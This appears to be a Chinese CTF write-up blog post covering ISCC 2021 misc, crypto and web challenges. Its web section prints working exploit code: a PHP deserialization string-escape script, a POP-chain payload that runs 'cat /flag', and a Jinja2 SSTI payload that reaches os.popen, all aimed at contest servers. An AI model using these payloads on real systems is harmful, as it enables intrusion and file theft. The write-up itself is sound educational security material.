---
title: ISCC 2021 WP
tags:
  - CTF-WEB
categories:
  - CTF-WEB
date: 2021-05-25 13:02:34
---

# MISC

## 李华的红包

打开发现是一个图片，binwalk分离下文件后得到一个txt文件，内容如下

```
24,43,13,13,12,21,43
```

很明显是敲击码（如果改下图片大小为521*521会看到下面有个鼓也会提示这是敲击码）

![image-20210521131735744](https://img-blog.csdnimg.cn/img_convert/f2ae75c5ad3e4a015f3b0a590c89a6dd.png)

分别对应着ISCCBFS

```
ISCC{ISCCBFS}
```

## Retrieve the passcode

解压后得到一个压缩包和一个名为scatter的txt文档

打开txt文档发现

```
1:3:1;1.25:3:1;1.5:3:1;1.75:3:1;2:3:1;2:2.75:1;2:2.5:1;2:2.25:1;2:2:1;2:1.75:1;2:1.5:1;1:2.25:1;1.25:2.25:1;1.5:2.25:1;1.75:2.25:1;1:1.5:1;1.25:1.5:1;1.5:1.5:1;1.75:1.5:1;3:3:1;3.25:3:1;3.5:3:1;3.75:3:1;4:3:1;3.25:2.25:1;3.5:2.25:1;3.75:2.25:1;4:2.25:1;4:2:1;4:1.75:1;4:1.5:1;3:1.5:1;3.25:1.5:1;3.5:1.5:1;3.75:1.5:1;3:1.75:1;3:2:1;3:2.25:1;3:2.5:1;3:2.75:1;5:3:1;5.25:3:1;5.5:3:1;5.75:3:1;6:3:1;6:2.25:1;6:2:1;6:1.75:1;6:1.5:1;5.75:1.5:1;5.5:1.5:1;5.25:1.5:1;5:1.5:1;5:2.25:1;5.25:2.25:1;5.5:2.25:1;5.75:2.25:1;5:2.5:1;5:2.75:1;7:3:1;7.25:3:1;7.5:3:1;7.75:3:1;8:3:1;8:2.75:1;8:2.5:1;8:2.25:1;8:2:1;8:1.75:1;8:1.5:1;9:3:1;9.25:3:1;9.5:3:1;9.75:3:1;10:3:1;10:2.75:1;10:2.5:1;10:2.25:1;9.75:2.25:1;9.5:2.25:1;9.25:2.25:1;9:2.25:1;9:2:1;9:1.75:1;9:1.5:1;9.25:1.5:1;9.5:1.5:1;9.75:1.5:1;10:1.5:1;11:3:1;11.25:3:1;11.5:3:1;11.75:3:1;12:3:1;12:2.75:1;12:2.5:1;12:2.25:1;12:2:1;12:1.75:1;12:1.5:1;11.75:1.5:1;11.5:1.5:1;11.25:1.5:1;11:1.5:1;11:1.75:1;11:2:1;11:2.25:1;11:2.5:1;11:2.75:1;11.25:2.25:1;11.5:2.25:1;11.75:2.25:1
```

三维数据还提示了scatter应该是用这些数据画图

```python
import matplotlib.pyplot as plt 
with open('scatter.txt','r') as n:
    all = n.read()
    a = all.split(";")

x_value = []
y_value = []

for i in a:
    x_value.append(i.split(':')[0])
    y_value.append(i.split(":")[1])

plt.scatter(x_value,y_value,s=20)

#显示
plt.show()
```

稍微改一下宽高**，**得到一个这个东西**，**看不出来是个啥

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210502005412635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMDc4MjI5,size_16,color_FFFFFF,t_70)

颠倒一下**，**得到密码365728

打开pdf

![image-20210518131743000](https://img-blog.csdnimg.cn/img_convert/39fa8cbaab511371cc5c8a5d801b3999.png)

很明显是摩斯密码

解密得到

```
CONGRATULATIONTHEFLAGIS
CHALLENGEISCCTWOZEROTWOONE
```

！坑点来了，两个解密的语句都是flag的一部分，当时我也是一直试CHALLENGEISCCTWOZEROTWOONE这个，大小写什么的都不行，后来看群里也有人被这个折磨疯了问到底是啥，有个人说两个都要，我才想到第一个也是flag的一部分，只能说这脑洞纯粹为了脑洞而脑洞。。。。

## 海市蜃楼-1

打开看着是一个docx文件，里面乱码。docx其实本质就是zip，直接改后缀为zip，然后解压

在文件里搜索flag即可（这里我用的是sublime）

![image-20210518132718171](https://img-blog.csdnimg.cn/img_convert/5949a364b7066f9359ccc88c76378d1f.png)

## 美人计

题目描述：美人说的话里有解题提示，但是美人的话不能全信。这句话很关键

用十六进制编辑器打开图片得到提示

![image-20210518133033001](https://img-blog.csdnimg.cn/img_convert/5e850fac0fd0326813e29bd3a2bf7bee.png)

大致意思是尝试AES，然后就会得到flag。还给了ISCC2021（估计是密钥）

> 由于我是用的linux，没法像windows那样看图片属性里的详细信息，其实这个提示在windows下右键看图片的备注也可以看到

解压后还有个word文档，是一个二维码，扫码后得到U2Fs开头的一段代码

```
U2FsdGVkX1/Ka+sScszwQkwhO+VLiJwV/6IFg5W+TfNHGxG2qZsIr2iwMwb9X9Iu 3GuGWmPOtO27z8vNppD2D50fwsD+8VWhdtW9J4cewYivH/Z/7GoUvcJXJMrvf+vu +CBqWDGp6HWd0e5whGhuzlK0ZtBcDZdPDSIHA7+GuUlifp8PcFCtJPgiuk143REE +pKFiSJXolXLR1vJCdGY9w5mXFbiWPrb2U7r/v5noP8=
```

尝试AES解密，密钥是ISCC2021，成功解密但是得到的还是U2Fs开头的加密的内容，多次解密后得到flag

wait

怎么可能那么简单，太小看出题人的套路了，事实上是得到了这样一句话

```
y0u_h@ve_fal1en_intO_tHe_tr@p_0f_tHe_be@uty_!
```

就是这样毫无防备的陷入了陷阱。。。

于是冥思苦想到底是哪错了

然后我把那个docx文档改成了zip解压后用sublime打开

然后发现了两个二维码，下面这个是打开word文档看到的

![image-20210518134433510](https://img-blog.csdnimg.cn/img_convert/e50c8fbd5ea975a651ab6e7bca250417.png)

下面这个是另外一个二维码

![image-20210518134508339](https://img-blog.csdnimg.cn/img_convert/c0649d2394e0cd367b3486d58771a028.png)

扫描后得到了又一段U2Fs开头的代码

```
U2FsdGVkX19eOY/pDh8+vPAcvfkLi1XLUneVzjLLOMul53sKK8UpobdCOiPIv4KE
```

尝试AES解密，然后提示解密失败

？？？？？？？？

然后尝试DES解密，密钥仍是ISCC2021，终于得到了flag

![image-20210518134805104](https://img-blog.csdnimg.cn/img_convert/0719fa669b514ebfbdd2b4f1a6a9a39a.png)



果然漂亮的女人信不得，给了个二维码、加密方式没一个是真的。。。

## 我的折扣是多少

运行exe文件得到pass1{\u006b\u0072\u0077}，Unicode编码，解码后为pass1{krw}

在压缩文件最后有一段base64编码

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210505003143992.png)

解出来是pass2{gcc666}

用密码krwgcc666解开压缩包

得到base编码：eW91Zm91bmRtZT8=

base64解出来是：youfoundme?

还剩下个mp3，MP3一般都是用MP3stego解密，密码是youfoundme?

得到ISCC{LFXXK4TENFZWG33VNZ2DELRRGU\=\=====}

其中LFXXK4TENFZWG33VNZ2DELRRGU=\=\====用base32解密得到`Yourdiscount2.15`
flag是ISCCP{Yourdiscount2.15}

这里推荐下我的一个base家族的脚本（可尝试base16、base32、base36、base58、base62、base64、base85、base91、base92）,这种base解密直接丢到脚本里，看哪个能解出来

链接地址：[Base家族加密解密.py](https://download.csdn.net/download/zss192/12133420)

若没有积分可以评论留言邮箱私发给你

## 区块链

第一次接触区块链的题目，在网上看了很多基础的CTF区块链的题目

当时直接搜题目中的代码搜到了几篇文章，如[0x41414141 CTF区块链编写](https://ashiq.co.za/posts/0x41414141-CTF-Blockchain-Writeups/)

虽然看着和这题差不多但按照他说的一直没解出来，但也提供了一些思路

然后在另一篇文章看到了类似的区块链题目，具体链接我也找不到了

打开这个链接：[Etherscan](https://rinkeby.etherscan.io/)

在搜索框输入合约地址0x0ed72dfd4c63dd97df8fec07e5a6bba466c6adf5

然后点击这个地方

![image-20210518140256588](https://img-blog.csdnimg.cn/img_convert/87bdfdf2058d257eaa8fb84ddfad870f.png)

这里点击"UTF-8"

![image-20210518140348846](https://img-blog.csdnimg.cn/img_convert/b0f24339ee129c739dddd4be9dfc1b2e.png)

得到flag

![image-20210518140409432](https://img-blog.csdnimg.cn/img_convert/0541cbfabecb92ea302292d27f959d10.png)

## Hack the Victim

和上题区块链类似

也是给了个合约地址：0x68D28fE315E6A344029D42915Fbc7af4261AB833

同样打开上述题目的网站，搜索这个合约地址

不过不同的是这题需要反编译

![image-20210518140638282](https://img-blog.csdnimg.cn/img_convert/120760e12d07e05cd974bced772977ee.png)

反编译后得到flag

![image-20210518140707320](https://img-blog.csdnimg.cn/img_convert/f43afba5602e0a29e880ca73243d1070.png)

## 检查一下

解压后得到一个png图片，binwalk下发现里面有zlib数据，尝试分离(binwalk -e)

![image-20210518140908156](https://img-blog.csdnimg.cn/img_convert/296dc3abbb650b8571e506905a65ef1d.png)

分离后有一个txt文档打开后发现是01字符串

![image-20210518141009150](https://img-blog.csdnimg.cn/img_convert/372a533aa1160a821a557a6f4f170a56.png)

联想到是01字符串画二维码

先看下字符串长度发现是841，而正好是29的平方，那应该就是二维码了

上脚本

> 注：我总结了一些CTF杂项脚本：https://github.com/zss192/CTF-python-script
>
> 觉得还可以的话给个star吧

```python
from PIL import Image
MAX = 29    #宽高 841个01字符串，所以宽和高是29
pic = Image.new("RGB",(MAX, MAX))
#若是(255,255,255)、(0,0,0)需要先转换01 
str = "1111111000100100110000111111110000010011011110010101000001101110100111010011010010111011011101000000111011110101110110111010010111101110001011101100000101110111000010010000011111111010101010101010111111100000000011100100110100000000100101101110000101010101000001101000011101011011011100101000001110010010001111011110010001100000101101100111111001010110101101110000100011110100110001001100010010101110000111111111110010100110101001111110010110001100110111110111000110011110010001111001110000100011010000110100100000001011001010101101110100011011010011100011101001111011111000101001101101101100101010001111101000000000011101101101010001011011111110000011110000101011010100000101011110010101000101101011101001010011001011111001010111010110101111000001101001101110100101010000010100111011000001000011101000011001001011111110100100100000111100110"
i=0
for y in range (0,MAX):
    for x in range (0,MAX):
        if(str[i] == '1'):
            pic.putpixel([x,y],(0, 0, 0))
        else:
            pic.putpixel([x,y],(255,255,255))
        i = i+1
pic.show()
pic.save("./flag.png")
```

得到二维码，扫码即可得到flag

![image-20210518141632248](https://img-blog.csdnimg.cn/img_convert/fcac7cb6cb08c6515341469625f47e80.png)

## 小明的宠物兔

下载附件发现是一个名为rabbit的图片，一个胖兔子说着我需要碰撞

用binwalk分离图片得到flag.txt和key.zip

flag.txt中内容为U2FsdGVkX18kNy7RlBvcV9WJsqa+oxvdd0Ir86U2cU2996N6ltZi7VVOaw==

显然需要密钥解密

打开key.zip发现其中的key.txt只有5字节大小结合那个兔子说的它需要碰撞应该是crc32碰撞

上脚本（Python2）

```python
import binascii

dic = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()_+- ={}[]"
crc = 0x3DACAC6B  
for i in dic : 
    for j in dic:
        for p in dic:
            for q in dic:
                for a in dic:
                    s=i+j+p+q+a
                    if crc == (binascii.crc32(s) & 0xffffffff):
                        print s 
```

CRC32可由一些压缩软件看到，也可以用十六进制编辑器看到

CRC32在这个位置，但注意的是要反过来即0x3DACAC6B  

![image-20210518142412441](https://img-blog.csdnimg.cn/img_convert/68478d30706be46c79ffa153887b77d2.png)

由于5层循环，且未优化时间会长点，

解出来的第二个看着像是密钥，尝试下解密

结合图片名为rabbit，可能是rabbit加密，尝试下果然是，得到flag

![image-20210518144920078](https://img-blog.csdnimg.cn/img_convert/440cf3e5e5a2e150d1761a52fe368b46.png)

## 变异的SM2

密码学题目，我不擅长这方面，果断搜下关键处代码，果然搜到了原题

该题目是2020ByteCTF决赛的题目threshold

搜到的一个WP链接：https://ctf.njupt.edu.cn/545.html

需要改下脚本，把server.py和写的脚本放到同一路径下

```python
from pwn import *
from Crypto.Util.number import *
from gmssl import func, sm2

import server

r = remote("129.211.59.129", 20001)

# context.log_level = 'debug'

pk = int(r.recvline().split(b":")[1].decode(), 16)
pks = int(r.recvline().split(b":")[1].decode(), 16)
log.info(f"pk: {pk}")
log.info(f"pks: {pks}")

backdoor = b'0'*128 + b'1'
r.sendlineafter(b"op: ", b"sign")
r.sendlineafter(b"backdoor:", backdoor)
sks = int(r.recvline(), 16)

n = 115792089210356248756420345214020892766061623724957744567843809356293439045923

# pks = (sk + 1) * sks ^ -1

sk = inverse(pks * sks, n) - 1
log.info(f"sk: {sk}")

data = b'Hello, Welcome to ISCC2021!'
e = int(data.hex(), 16)

k = 2
tsm2 = server.TSM2('0xdeadbeaf')
P1_P2 = tsm2._kg(k, server.G)
R = int(P1_P2[:64], 16) + e

s = inverse(1+sk, n) * (k - R*sk) % n

r.sendlineafter(b"op: ", b"verify")
r.sendlineafter(b"msg:", data)
r.sendlineafter(b"sign:", hex(R)[2:].zfill(64) + hex(s)[2:].zfill(64))

r.interactive()
```

flag如下

![image-20210518144852630](https://img-blog.csdnimg.cn/img_convert/eee34db53ae938d55a0f3ca08e7b07ce.png)

# WEB

## ISCC客服冲冲冲（一）

题目大致意思是要给左面的客服一号投票超过右面的投票

![image-20210518122525606](https://img-blog.csdnimg.cn/img_convert/8633f7a3fe0f999651aa82969214b696.png)

- WP1：其实第一次做的时候直接尝试一直点左边的投票，结果还真的超过了右边的票数，直接给了flag。

题目原意应该是不用手动点而是用其他方法的，不过最终也算拿到了flag

- WP2：互换左右投票的ID，这样自动加的票就会加给左边的，等待计时结束即可
- 其它WP：由于是前端控制，所以解法很多，比如用连点器，或者在 Console 里搜一下，有个 votes，直接设置，这道题可以说有非常多解题方法了，这里就不再过多阐述

## 这是啥

查看源代码发现如图所示代码，一看就是JSFuck

![image-20210518122645074](https://img-blog.csdnimg.cn/img_convert/f6b7238a89a96abeebb69ab68b03f63c.png)

直接复制到控制台回车

![image-20210518122845010](https://img-blog.csdnimg.cn/img_convert/627d8eb450084dca4ab7345a85a2c6e2.png)

## Web01

打开便提示Why don't you take a look at robots.txt?

那就访问robots.txt看看呗，发现Disallow: /src/code/code.txt

所以就访问http://39.96.91.106:7040/code/code.txt

发现几个判断条件，满足条件便会输出flag

```php
if (strlen($_GET['password']) < 8 && $_GET['password'] > 9999999)
```

参数长度小于8但数值还要大于9999999，直接用科学计数法如1e9绕过即可

```php
if (strpos ($_GET['password'], '*-*') !== FALSE)
```

要求参数里要含有\*-\*

所以最终请求参数为?password=1e9\*-\*

![image-20210518123714229](https://img-blog.csdnimg.cn/img_convert/8f5055abb4770740a35044a7e8959e13.png)

## ISCC客服一号冲冲冲（二）

该题目其实是Bugku的Login4 (CBC字节翻转攻击)

所以不再写WP了，留一个Je3写的WP链接：[ISCC ISCC客服一号冲冲冲（二）](https://blog.csdn.net/jvkyvly/article/details/116755861)

## 登录

WP来自CSDN中[huamanggg](https://blog.csdn.net/m0_51078229)师傅

源码泄露www.zip
拿到代码**，**发现有注册页面**，**随便注册一个页面**，**登陆后有一个update信息**，**可以上传文件

```php
<?php
    require_once('class.php');
    if($_SESSION['username'] == null) {
        die('Login First'); 
    }
    if($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {

        $username = $_SESSION['username'];
        if(!preg_match('/^\d{11}$/', $_POST['phone']))
            die('Invalid phone');

        if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))
            die('Invalid email');
        
        if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
            die('Invalid nickname');

        $file = $_FILES['photo'];
        if($file['size'] < 5 or $file['size'] > 1000000)
            die('Photo size error');

        move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));
        $profile['phone'] = $_POST['phone'];
        $profile['email'] = $_POST['email'];
        $profile['nickname'] = $_POST['nickname'];
        $profile['photo'] = 'upload/' . md5($file['name']);

        $user->update_profile($username, serialize($profile));
        echo 'Update Profile Success!<a href="profile.php">Your Profile</a>';
    }
    else {
?>
```

继续看源码**，**得到上传路径**，**但是MD5加密了**，**所以后缀是没有了

```php
move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));
```

这样一来**，**传配置文件也是没用了
 看到了config.php里面有flag

```php
<?php
    $config['hostname'] = '127.0.0.1';
    $config['username'] = 'root';
    $config['password'] = '';
    $config['database'] = '';
    $flag = '';
?>
```

class.php里面的filter函数里面有preg_replace**，**可能漏洞出现在这里

```php
public function filter($string) {
        $escape = array('\'', '\\\\');
        $escape = '/' . implode('|', $escape) . '/';
        $string = preg_replace($escape, '_', $string);

        $safe = array('select', 'insert', 'update', 'delete', 'where');
        $safe = '/' . implode('|', $safe) . '/i';
        return preg_replace($safe, 'hacker', $string);
```

结合这个猜测是**反序列化的字符串逃逸**

```php
$photo = base64_encode(file_get_contents($profile['photo']));
```

先分析一下这个过滤：

- implode()函数：`implode(separator**,**array)`
  把数组里的元素以某字符连接
- preg_replace()函数：`preg_replace ( mixed $pattern **,** mixed $replacement **,** mixed $subject`
  用第三个参数匹配第一个参数的正则**，**换成第二个参数

第一个preg_replace()：
 把`'`和`\\`换成`_`

第二个preg_replace():
 匹配`/select|insert|update|delete|where/`换成hacker
 其他的几个都是六个字符**，**和hacker一样长**，**所以我们选择where来对他进行逃逸

当我们更新了信息后**，**执行这个方法**，**经过filter过滤后再赋值到$username里面

```php
public function update_profile($username, $new_profile) {
        $username = parent::filter($username);
        $new_profile = parent::filter($new_profile);

        $where = "username = '$username'";
        return parent::update($this->table, 'profile', $new_profile, $where);
```

生成这样的序列化字符串

```php
a:4:{s:5:"phone";s:11:"11111111111";s:5:"email";s:10:"123@qq.com";s:8:"nickname";s:3:"123";s:5:"photo";s:39:"upload/25a452927110e39a345a2511c57647f2";}
```

既然photo会被md5加密**，**我们就逃逸出来**，**构造一个photo出来**，**所以 从nickname里面下手**，**把photo的内容改成config.php

一个where换成hacker会多一个字符**，**`";s:5:"photo";s:10:"config.php";}`这里一共有33个字符 **，**所以写33个where就刚刚好把伪造的photo给挤出去了

```php
wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";s:5:"photo";s:10:"config.php";}
```

问题又来了**，**太长了

```php
if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
            die('Invalid nickname');
```

绕过方法是**数组绕过**：

数组绕过的话**，**payload还得改**，**要用`";}`来闭合了
 格式是这样的：

```php
a:4:{s:5:"phone";s:11:"11111111111";s:5:"email";s:10:"123@qq.com";s:8:"nickname";a:1:{i:0;s:3:"123";}s:5:"photo";s:39:"upload/d41d8cd98f00b204e9800998ecf8427e";}
```

所以`";}s:5:"photo";s:10:"config.php";}`长度为34
 payload：

```php
wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}
```

改为数组形式
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210502174350475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMDc4MjI5,size_16,color_FFFFFF,t_70)

成功拿到config.php的源码

![image-20210518125123108](https://img-blog.csdnimg.cn/img_convert/d9a7ee8c5d19e10820acb5ac2b65c7d8.png)

一把嗦脚本：

```python
#-*- encoding: utf-8 -*-
import requests
import re
import base64

class Fuck:
    def __init__(self):
        self.url = "http://39.96.91.106:7010/"
        self.s = requests.session()
    
    def register(self, username):
        url = self.url + "register.php"
        data = {"username": username, "password": "123123"}
        self.s.post(url, data=data)
    
    def login(self, username):
        url = self.url + "index.php"
        data = {"username": username, "password": "123123"}
        self.s.post(url, data=data)
    
    def update(self):
        url = self.url + "update.php"
        files = {"photo": ("fuck", "123123123123123123123123123123")}
        data = {"phone": "11111111111", "email": "123@qq.com", "nickname[]": 
            '''wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}'''
        }
        self.s.post(url, data=data, files=files)
    
    def profile(self):
        url = self.url + "profile.php"
        res = self.s.get(url)
        flag = re.findall(re.compile(r'(?<=base64,).*(?=" class)'), res.text)
        flag = re.findall(re.compile(r'(?<=flag = \').*(?=\';)'), base64.b64decode(flag[0]).decode())
        print(flag[0])

if __name__ == "__main__":
    username = ""
    fuck = Fuck()
    fuck.register(username)
    fuck.login(username)
    fuck.update()
    fuck.profile()
```

## which is the true iscc

此WP还是来自CSDN中[huamanggg](https://blog.csdn.net/m0_51078229)师傅（我太菜了）

注释了一些提示

```html
<a href="/?whatareyounongshane=src">我真的是源码?</a> 
<a href="/?whatareyounongshane=cmd">干点好事!</a> 
<a href="/?whatareyounongshane=upload">送点东西!</a> 
<a href="/?whatareyounongshane=tellmetruth">快告诉我真相!</a>
```

源码里的ISCC_Command类里面的__destruct方法可以执行命令**，**这里应该是最终要走到的点

这样的话就追着cmd变量来看**，**明显看类名知道**，**会在ISCC_ResetCMD类里面对cmd进行重新赋值
这里的__destruct方法必须得满足这个才能重置命令

```php
if($_SESSION['name'] === 'isccIsCciScc1scc') {            $cmd = $this->new_cmd;        }
```

一般来说**，**想要控制$_SESSION的值**，**都是使用变量覆盖来做的**，**这题应该也不例外

在ISCC__Upload类里面**，**有着这样的一批代码

```php
if ($is_upload) { foreach ($_FILES as $key => $value)     $GLOBALS[$key] = $value;
```

这个东西：`$GLOBALS['key'] = value;`　　
指的的是PHP当前页面的全局变量$key = value的引用

当$is_upload为true的时候**，**就会触发这个循环**，**可以实现$_SESSION的变量覆盖
而在upload类里面的__wakeup方法里面`$is_upload = (count($_FILES) > 0);`会把他设置成true**，**其他的类都设置成了false
所以我们就要让upload执行__destruct的时候**，**is_upload是true
这就要求**，**最早执行__destruct**，**最晚执行__wakeup
所以就可以按一定顺序来构造pop链

由于有一个waf函数**，**不准出现***，**而$new_cmd属性是protected的**，**序列化了就一定要带***，**绕过的方法就是16进制

```php
function waf($s) {    
    if(stripos($s**,** "*") !== FALSE)        
        return false;    return true; 
}
```

那我们这样构造pop链：

```php
<?php
class ISCC_Command {

}
class ISCC_ResetCMD {

    protected $new_cmd = "cat /flag";
    function __construct(){
        $this->x=new ISCC_Command();
    }

}
class ISCC_Upload {
    function __construct(){
        $this->y=new ISCC_ResetCMD();
    }
}
$b = new ISCC_Upload();
$c=urlencode(serialize($b));
$c=str_replace("s","S",$c);
$c=str_replace("%2A",'\2a',$c);
echo $c;
```

payload：

```html
O%3A11%3A%22ISCC_Upload%22%3A1%3A%7BS%3A1%3A%22y%22%3BO%3A13%3A%22ISCC_ReSetCMD%22%3A2%3A%7BS%3A10%3A%22%00\2a%00new_cmd%22%3BS%3A9%3A%22cat+%2Fflag%22%3BS%3A1%3A%22x%22%3BO%3A12%3A%22ISCC_Command%22%3A0%3A%7B%7D%7D%7D
```

最终的poc：

```python
import requests

url="http://39.96.91.106:7050/"

files={
    'iscc_file':("b",open("1.png","rb")),
    "_SESSION":("isccIsCciScc1scc","123")
}

r=requests.post(url=url+"??=O%3A11%3A%22ISCC_Upload%22%3A1%3A%7BS%3A1%3A%22a%22%3BO%3A13%3A%22ISCC_ReSetCMD%22%3A2%3A%7BS%3A10%3A%22%00%5C2a%00new_cmd%22%3BS%3A9%3A%22cat+%2Fflag%22%3BS%3A1%3A%22b%22%3BO%3A12%3A%22ISCC_Command%22%3A0%3A%7B%7D%7D%7D",files=files)
print(r.text) 
```

## lovely ssti

参数是xiaodouni

payload如下

```python
{% set xiahua=(config|string)[14]%}
{% set gb=(xiahua,xiahua,"globals",xiahua,xiahua)|join %}
{% set bl=(xiahua,xiahua,"builtins",xiahua,xiahua)|join %}
{% set cr=(lipsum|attr(gb)|attr("get")(bl))["ch""r"] %}
{% set dian=cr(46)%}
{% set xing =cr(42)%}
{% set shell=("find / -name ",xing,"fla",xing)|join%}
{% set shell4 = "cat /usr/fla??is?here?txt"%}
{{(lipsum|attr(gb)|attr("get")("o""s")|attr("po""pen")(shell4))|attr("read")()}}
```

可参考这篇博客：[ISCC SSTI](https://blog.csdn.net/jvkyvly/article/details/116953370)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210525202556996.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70)

```bash
ISCC{SsT1_is_eAsy_T0_lEarn(*~*)}
```
